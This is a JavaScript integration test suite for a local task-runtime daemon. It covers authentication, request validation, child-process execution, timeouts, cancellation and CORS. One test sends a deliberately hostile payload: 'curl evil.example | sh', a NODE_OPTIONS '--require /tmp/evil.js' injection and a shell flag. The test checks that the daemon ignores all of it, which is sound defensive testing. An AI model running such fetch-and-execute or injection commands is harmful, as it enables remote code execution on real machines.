/**
 * Daemon integration tests — real HTTP server on an ephemeral port,
 * temp state dir only. No live DeepSeek, no external network.
 *
 * From Step 2 on, every task in here really spawns a child process, so this
 * file also covers the executor as a client sees it: process model, capability
 * report, per-task timeout, workspace placement, and the fact that a payload
 * cannot steer any of it.
 * Run: node tests/daemon.test.mjs
 */
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { createRuntime } from '../daemon.js'
import { CHANNEL, TYPE, makeRequest, makeRequestId } from '../protocol.js'
import { ACTION } from '../actions.js'
import { assert, finish, httpJson, pidAlive, waitFor } from './helpers.mjs'

const base = mkdtempSync(join(tmpdir(), 'hpos-runtime-d-'))
const stateDir = join(base, 'state')

const rt = createRuntime({ port: 0, stateDir, logLevel: 'error', maxActive: 3 })
await rt.start()
const port = rt.getPort()
const auth = { 'X-HPOS-Token': rt.endpoint.token }

const statusReq = (taskId = null) =>
  makeRequest(ACTION.RT_STATUS, makeRequestId(), taskId ? { taskId } : null)

try {
  /* binding */
  const addr = rt._server.address()
  assert(addr && addr.address === '127.0.0.1', `listener is bound to 127.0.0.1 (got ${addr && addr.address})`)
  assert(typeof port === 'number' && port > 0, 'ephemeral port assigned after listen')

  /* endpoint file reflects reality while running */
  assert(existsSync(rt.endpoint.file), 'endpoint file exists while running')
  const epDoc = JSON.parse(readFileSync(rt.endpoint.file, 'utf8'))
  assert(epDoc.port === port, 'endpoint file updated with the real (ephemeral) port')
  assert(epDoc.token === rt.endpoint.token, 'endpoint file token matches the in-memory token')

  /* /health */
  const health = await httpJson('GET', { port, path: '/health' })
  assert(health.status === 200, 'GET /health → 200')
  assert(health.json && health.json.status === 'up', 'health reports up')
  assert(health.json.version === '0.1.0', 'health reports the version')
  assert(health.json.name === 'hpos-runtime', 'health identifies the runtime')
  assert(!health.text.includes(rt.endpoint.token), 'health body does not contain the token')
  assert(!/"token"/.test(health.text), 'health body has no token field at all')

  const nf = await httpJson('GET', { port, path: '/nope' })
  assert(nf.status === 404, 'unknown path → 404')
  const getRpc = await httpJson('GET', { port, path: '/rpc' })
  assert(getRpc.status === 405, 'GET /rpc → 405')
  const postHealth = await httpJson('POST', { port, path: '/health', body: {} })
  assert(postHealth.status === 405, 'POST /health → 405')

  /* authentication */
  const unauth = await httpJson('POST', { port, path: '/rpc', body: makeRequest(ACTION.PING, makeRequestId(), null) })
  assert(unauth.status === 401 && unauth.json && unauth.json.error.code === 'RT_UNAUTHORIZED',
    'missing token → 401 RT_UNAUTHORIZED')
  const wrongTok = await httpJson('POST', {
    port, path: '/rpc',
    headers: { 'X-HPOS-Token': 'f'.repeat(64) },
    body: makeRequest(ACTION.PING, makeRequestId(), null),
  })
  assert(wrongTok.status === 401 && wrongTok.json.error.code === 'RT_UNAUTHORIZED',
    'wrong token → 401 RT_UNAUTHORIZED')
  const shortTok = await httpJson('POST', {
    port, path: '/rpc',
    headers: { 'X-HPOS-Token': 'abc' },
    body: makeRequest(ACTION.PING, makeRequestId(), null),
  })
  assert(shortTok.status === 401, 'short token → 401 (length-safe comparison)')

  /* PING / PONG */
  const pingReq = makeRequest(ACTION.PING, makeRequestId(), null)
  const ping = await httpJson('POST', { port, path: '/rpc', headers: auth, body: pingReq })
  assert(ping.status === 200, 'PING → 200')
  assert(ping.json.channel === CHANNEL && ping.json.type === TYPE.RESPONSE, 'PING response envelope shape')
  assert(ping.json.action === 'PONG', 'PING answered with PONG')
  assert(ping.json.success === true, 'PING success')
  assert(ping.json.requestId === pingReq.requestId, 'PING requestId correlation')
  assert(ping.json.payload.version === '0.1.0' && ping.json.payload.engine === 'hpos-runtime',
    'PONG payload: version + engine')
  assert(!ping.text.includes(rt.endpoint.token), 'PONG response does not leak the token')

  /* RT_STATUS baseline */
  const s0 = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
  assert(s0.status === 200 && s0.json.success === true, 'RT_STATUS → 200 success')
  assert(s0.json.payload.status === 'up', 'RT_STATUS: runtime up')
  assert(s0.json.payload.tasks.total === 0 && s0.json.payload.tasks.active === 0,
    'RT_STATUS: zero tasks before any run')
  assert(Array.isArray(s0.json.payload.services) && s0.json.payload.services.includes('stub'),
    'RT_STATUS: lists the registered stub service')

  /* unsupported actions (envelope-level rejection) */
  for (const action of ['DS_SEND', 'DS_STATUS', 'EVAL', 'GET_COOKIES', 'SCRAPE', 'RT_TASK_PAUSE']) {
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth, body: makeRequest(action, makeRequestId(), null) })
    assert(r.status === 200 && r.json.success === false && r.json.error.code === 'UNKNOWN_ACTION',
      `RPC: "${action}" → 200 success:false UNKNOWN_ACTION`)
  }

  /* malformed envelopes (transport-level rejection) */
  const noReqId = { channel: CHANNEL, type: TYPE.REQUEST, action: 'PING', payload: null }
  const m1 = await httpJson('POST', { port, path: '/rpc', headers: auth, body: noReqId })
  assert(m1.status === 400 && m1.json.error.code === 'RT_INVALID_REQUEST',
    'missing requestId → 400 RT_INVALID_REQUEST')
  const m2 = await httpJson('POST', { port, path: '/rpc', headers: auth, body: { ...pingReq, channel: 'wrong' } })
  assert(m2.status === 400 && m2.json.error.code === 'RT_INVALID_REQUEST', 'wrong channel → 400 RT_INVALID_REQUEST')
  const m3 = await httpJson('POST', { port, path: '/rpc', headers: auth, body: { ...pingReq, type: TYPE.EVENT } })
  assert(m3.status === 400, 'EVENT type → 400')
  const m4 = await httpJson('POST', { port, path: '/rpc', headers: auth, body: 'not json' })
  assert(m4.status === 400 && m4.json.error.code === 'RT_INVALID_REQUEST', 'non-JSON body → 400')

  /* content-type + body size */
  const ct = await httpJson('POST', {
    port, path: '/rpc',
    headers: { ...auth, 'Content-Type': 'text/plain' },
    body: JSON.stringify(pingReq),
  })
  assert(ct.status === 415, 'non-JSON content-type → 415')
  const big = await httpJson('POST', {
    port, path: '/rpc', headers: auth,
    body: JSON.stringify({
      channel: CHANNEL, type: TYPE.REQUEST, action: 'PING',
      requestId: makeRequestId(), payload: { blob: 'x'.repeat(300 * 1024) },
    }),
  })
  assert(big.status === 413 && big.json.error.code === 'RT_BODY_TOO_LARGE',
    'oversized body → 413 RT_BODY_TOO_LARGE')

  /* task lifecycle: QUEUED → RUNNING → COMPLETE */
  const runReq = makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 30 })
  const run = await httpJson('POST', { port, path: '/rpc', headers: auth, body: runReq })
  assert(run.status === 200 && run.json.success === true, 'RT_TASK_RUN → 200 success')
  assert(typeof run.json.payload.taskId === 'string' && run.json.payload.taskId.startsWith('task-'),
    'RT_TASK_RUN returns a generated taskId')
  assert(run.json.payload.status === 'QUEUED', 'RT_TASK_RUN initial status is QUEUED')
  assert(run.json.requestId === runReq.requestId, 'RT_TASK_RUN requestId correlation')
  const taskId = run.json.payload.taskId

  const done = await waitFor(async () => {
    const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(taskId) })
    const t = s.json && s.json.payload && s.json.payload.task
    return t && t.status === 'COMPLETE' ? t : null
  })
  assert(Boolean(done), 'task reaches COMPLETE within the timeout')
  const states = done.history.map((h) => h.state)
  assert(JSON.stringify(states) === JSON.stringify(['QUEUED', 'RUNNING', 'COMPLETE']),
    `task history is QUEUED → RUNNING → COMPLETE (got ${states.join(' → ')})`)
  assert(typeof done.startedAt === 'number' && typeof done.endedAt === 'number' && done.endedAt >= done.startedAt,
    'task timestamps set (startedAt ≤ endedAt)')

  const sAfter = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
  assert(sAfter.json.payload.tasks.total === 1 && sAfter.json.payload.tasks.completed === 1,
    'counters reflect one completed task')
  assert(sAfter.json.payload.recent.some((t) => t.taskId === taskId),
    'RT_STATUS recent list includes the finished task')

  /* payload validation */
  const unknownSvc = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'deepseek' }) })
  assert(unknownSvc.json.success === false && unknownSvc.json.error.code === 'RT_UNKNOWN_SERVICE',
    'unknown service → RT_UNKNOWN_SERVICE (no real integration yet)')
  const badDur = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { durationMs: -5 }) })
  assert(badDur.json.success === false && badDur.json.error.code === 'RT_INVALID_PAYLOAD',
    'negative durationMs → RT_INVALID_PAYLOAD')
  const strDur = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { durationMs: 'abc' }) })
  assert(strDur.json.success === false && strDur.json.error.code === 'RT_INVALID_PAYLOAD',
    'non-numeric durationMs → RT_INVALID_PAYLOAD')
  const noStop = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), {}) })
  assert(noStop.json.success === false && noStop.json.error.code === 'RT_INVALID_PAYLOAD',
    'RT_TASK_STOP without taskId → RT_INVALID_PAYLOAD')

  /* stop: cancel an active task */
  const long = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 5000 }) })
  const longId = long.json.payload.taskId
  await waitFor(async () => {
    const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(longId) })
    const t = s.json && s.json.payload && s.json.payload.task
    return t && t.status === 'RUNNING' ? t : null
  })
  const stopped = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: longId }) })
  assert(stopped.json.success === true && stopped.json.payload.status === 'CANCELLED',
    'RT_TASK_STOP on a RUNNING task → CANCELLED')
  const afterStop = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(longId) })
  assert(afterStop.json.payload.task.status === 'CANCELLED' && afterStop.json.payload.task.endedAt != null,
    'stopped task stays CANCELLED with an endedAt')
  const doubleStop = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: longId }) })
  assert(doubleStop.json.success === false && doubleStop.json.error.code === 'RT_TASK_NOT_CANCELABLE',
    'second stop → RT_TASK_NOT_CANCELABLE')
  const ghostId = 'task-00000000-0000-0000-0000-000000000000'
  const stopGhost = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: ghostId }) })
  assert(stopGhost.json.success === false && stopGhost.json.error.code === 'RT_TASK_NOT_FOUND',
    'stop of unknown task → RT_TASK_NOT_FOUND')
  const statusGhost = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(ghostId) })
  assert(statusGhost.json.success === false && statusGhost.json.error.code === 'RT_TASK_NOT_FOUND',
    'RT_STATUS of unknown task → RT_TASK_NOT_FOUND')

  /* queue full (maxActive = 3 for this test runtime) */
  const batch = []
  for (let i = 0; i < 3; i++) {
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 600 }) })
    batch.push(r.json.payload.taskId)
  }
  const overflow = await httpJson('POST', { port, path: '/rpc', headers: auth,
    body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 600 }) })
  assert(overflow.json.success === false && overflow.json.error.code === 'RT_QUEUE_FULL',
    '4th concurrent task → RT_QUEUE_FULL')
  for (const id of batch) {
    await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: id }) })
  }
  const afterBatch = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
  assert(afterBatch.json.payload.tasks.active === 0, 'after stops, no active tasks remain')

  /* ---- Step 2: the executor as an RPC client sees it ---- */
  {
    const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
    const ex = s.json.payload.executor
    assert(ex && ex.model === 'child-process', 'RT_STATUS: tasks execute in a child process')
    assert(ex.executesInDaemon === false, 'RT_STATUS: the daemon states it does not execute tasks itself')
    assert(ex.limits.minTimeoutMs === 1000 && ex.limits.maxTimeoutMs === 600000,
      'RT_STATUS: publishes the timeout window a client must respect')
    assert(ex.limits.killGraceMs > 0 && ex.limits.maxOutputBytes > 0,
      'RT_STATUS: publishes the kill grace period and output cap')
    assert(Array.isArray(ex.processes) && ex.processes.length === 0,
      'RT_STATUS: no children are live once the earlier tasks settled')
    assert(ex.stats && ex.stats.spawned > 0 && ex.stats.live === 0,
      'RT_STATUS: the supervisor reports what it spawned and that nothing is live')
    const caps = s.json.payload.capabilities
    assert(caps && caps.execution.shell === false, 'RT_STATUS: no shell, declared')
    assert(caps.heapLimit.enforced === true && caps.wallClockTimeout.enforced === true,
      'RT_STATUS: the limits that are enforced are reported as enforced')
    assert(caps.rlimit.enforced === false && caps.jobObjects.enforced === false,
      'RT_STATUS: the limits we cannot enforce are NOT claimed')
    if (process.platform === 'win32') {
      assert(caps.processGroupKill.supported === false, 'win32: no group-kill claim')
      assert(/TerminateProcess/.test(caps.gracefulTermination.mechanism), 'win32: names TerminateProcess')
    } else {
      assert(caps.processGroupKill.supported === true, 'posix: group kill is available and enforced')
    }
    assert(Array.isArray(s.json.payload.capabilityNotes) && s.json.payload.capabilityNotes.length === 9,
      'RT_STATUS: human-readable capability notes for the UI')
    assert(!s.text.includes(rt.endpoint.token), 'RT_STATUS: the executor report leaks no token')
  }

  /* ---- a task really gets its own process, pid, and workspace ---- */
  {
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 400 }) })
    const id = r.json.payload.taskId
    const running = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(id) })
      const t = s.json.payload.task
      return t && t.status === 'RUNNING' && t.pid ? t : null
    }, { timeoutMs: 6000 })
    assert(Boolean(running), 'the task reached RUNNING with a pid attached')
    assert(running.pid !== process.pid, 'the pid is not the daemon’s own')
    assert(pidAlive(running.pid), 'that pid is a live process while the task runs')
    assert(running.workspaceDir.startsWith(join(stateDir, 'workspaces')),
      'the task workspace is under the runtime state dir, not the repository')
    const procRow = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
    assert(procRow.json.payload.executor.processes.some((p) => p.pid === running.pid && p.taskId === id),
      'RT_STATUS correlates the live pid with the taskId')
    const done = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(id) })
      const t = s.json.payload.task
      return t && (t.status === 'COMPLETE' || t.status === 'FAILED') ? t : null
    }, { timeoutMs: 8000 })
    assert(done.status === 'COMPLETE', 'the child completed its task')
    assert(done.exitCode === 0 && done.exitSignal === null, 'with a clean exit code')
    assert(!pidAlive(running.pid), 'and the child was reaped')
    assert(!existsSync(done.workspaceDir), 'and its workspace was removed')
    assert(done.resources.workspaceFiles >= 1, 'the cleanup reported what it removed')
  }

  /* ---- per-task timeout over RPC ---- */
  {
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 30000, timeoutMs: 1000 }) })
    assert(r.json.success === true, 'a task with a short timeout is accepted')
    const t0 = Date.now()
    const done = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(r.json.payload.taskId) })
      const t = s.json.payload.task
      return t && t.status !== 'QUEUED' && t.status !== 'RUNNING' ? t : null
    }, { timeoutMs: 10000 })
    assert(done.status === 'FAILED', 'the long task is FAILED by its timeout, not left running')
    assert(done.failure.kind === 'TIMEOUT', 'and says TIMEOUT rather than a generic failure')
    assert(done.timedOut === true && done.endedAt - done.startedAt < 6000,
      `it ended promptly (${done.endedAt - done.startedAt}ms)`)
    assert(done.timeoutMs === 1000, 'the enforced timeout is on the record')
    assert(Date.now() - t0 < 9000, 'the whole round trip stayed inside the polling budget')
    assert(done.workspaceRemoved === true, 'the timed-out workspace was cleaned up')
  }

  /* ---- timeoutMs validation ---- */
  {
    /* (Infinity is not in this list on purpose: JSON serialises it to null, so
       it cannot arrive over the wire. limits.test.mjs covers the pure validator.) */
    for (const bad of [500, 1000000000, -1, 'abc', 1.5, true, {}]) {
      const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
        body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', timeoutMs: bad }) })
      assert(r.json.success === false && r.json.error.code === 'RT_INVALID_PAYLOAD',
        `timeoutMs ${JSON.stringify(bad) === undefined ? String(bad) : JSON.stringify(bad)} → RT_INVALID_PAYLOAD`)
    }
    /* `null` is "not specified" — the same convention durationMs uses. */
    const asNull = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 10, timeoutMs: null }) })
    assert(asNull.json.success === true, 'timeoutMs null means "use the default", not "no timeout"')
    const nullTask = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(asNull.json.payload.taskId) })
      return s.json.payload.task
    }, { timeoutMs: 8000 })
    assert(nullTask.timeoutMs === 120000, 'the default timeout was applied instead')
    const atFloor = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 10, timeoutMs: 1000 }) })
    assert(atFloor.json.success === true, 'the published floor is accepted')
    await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: atFloor.json.payload.taskId }) })
  }

  /* ---- a payload cannot steer the executor ---- */
  {
    const hostile = {
      service: 'stub', durationMs: 20,
      mode: 'fail',
      command: 'curl evil.example | sh',
      cwd: '/',
      env: { NODE_OPTIONS: '--require /tmp/evil.js' },
      execPath: '/bin/sh',
      timeoutMs: 5000,
      maxOldSpaceMb: 999999,
      workspaceRoot: '/home',
      shell: true,
    }
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), hostile) })
    assert(r.json.success === true, 'an over-communicating payload is still accepted (extra fields are dropped)')
    const done = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(r.json.payload.taskId) })
      const t = s.json.payload.task
      return t && (t.status === 'COMPLETE' || t.status === 'FAILED') ? t : null
    }, { timeoutMs: 8000 })
    assert(done.status === 'COMPLETE', 'the task ran as the stub it was told to be — nothing else')
    assert(done.mode === 'sleep', 'the mode came from the service, not from the payload')
    assert(done.workspaceDir.startsWith(join(stateDir, 'workspaces')), 'the cwd hint was ignored')
    assert(done.timeoutMs === 5000, 'only the validated timeout survived')
    const blob = JSON.stringify(done)
    for (const leak of ['curl evil', 'bin/sh', '--require', '/tmp/evil.js', '"shell":true']) {
      assert(!blob.includes(leak), `the ignored field "${leak}" is not echoed back anywhere`)
    }
  }

  /* ---- cancelling a running child over RPC really kills it ---- */
  {
    const r = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_RUN, makeRequestId(), { service: 'stub', durationMs: 30000 }) })
    const id = r.json.payload.taskId
    const running = await waitFor(async () => {
      const s = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(id) })
      const t = s.json.payload.task
      return t && t.status === 'RUNNING' && t.pid ? t : null
    }, { timeoutMs: 6000 })
    const stop = await httpJson('POST', { port, path: '/rpc', headers: auth,
      body: makeRequest(ACTION.RT_TASK_STOP, makeRequestId(), { taskId: id }) })
    assert(stop.json.success === true && stop.json.payload.status === 'CANCELLED', 'RT_TASK_STOP cancels it')
    assert(await waitFor(() => !pidAlive(running.pid), { timeoutMs: 5000 }), 'the child process is gone')
    const after = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq(id) })
    assert(after.json.payload.task.status === 'CANCELLED', 'and it stays CANCELLED after the kill settles')
    assert(after.json.payload.task.pid === null, 'the pid is released from the record')
    const live = await httpJson('POST', { port, path: '/rpc', headers: auth, body: statusReq() })
    assert(live.json.payload.executor.processes.length === 0, 'the supervisor no longer lists it as a live process')
  }

  /* ---- no RPC action can reach a shell, path or URL ---- */
  {
    for (const action of ['RT_TASK_EXEC', 'RT_EXEC', 'RT_SPAWN', 'RT_SHELL', 'RT_RUN_COMMAND',
      'RT_FETCH', 'RT_READ_FILE', 'RT_TASK_SET_LIMITS', 'RT_DAEMON_RESTART', 'RT_TASK_RESTART']) {
      const r = await httpJson('POST', { port, path: '/rpc', headers: auth, body: makeRequest(action, makeRequestId(), { command: 'id' }) })
      assert(r.json.success === false && r.json.error.code === 'UNKNOWN_ACTION',
        `"${action}" is not a runtime action, whatever its payload claims`)
    }
  }

  /* CORS: origin-allowlisted, never wildcard */
  const pre = await httpJson('OPTIONS', { port, path: '/rpc', headers: { Origin: 'http://localhost:5173' } })
  assert(pre.status === 204, 'preflight from allowed origin → 204')
  assert(pre.headers['access-control-allow-origin'] === 'http://localhost:5173',
    'preflight echoes the allowed origin')
  assert(String(pre.headers['access-control-allow-headers']).includes('X-HPOS-Token'),
    'preflight permits the token header')
  const evil = await httpJson('OPTIONS', { port, path: '/rpc', headers: { Origin: 'http://evil.example' } })
  assert(evil.status === 204 && !evil.headers['access-control-allow-origin'],
    'preflight from a foreign origin gets no CORS headers')
  const evilGet = await httpJson('GET', { port, path: '/health', headers: { Origin: 'http://evil.example' } })
  assert(!evilGet.headers['access-control-allow-origin'],
    'foreign origin gets no ACAO on real responses either')
} finally {
  await rt.stop()
  rmSync(base, { recursive: true, force: true })
}

/* shutdown semantics */
assert(rt._server.address() === null, 'after stop(), the listener is closed')
assert(!existsSync(rt.endpoint.file), 'after stop(), the endpoint file is released')

finish('runtime daemon')
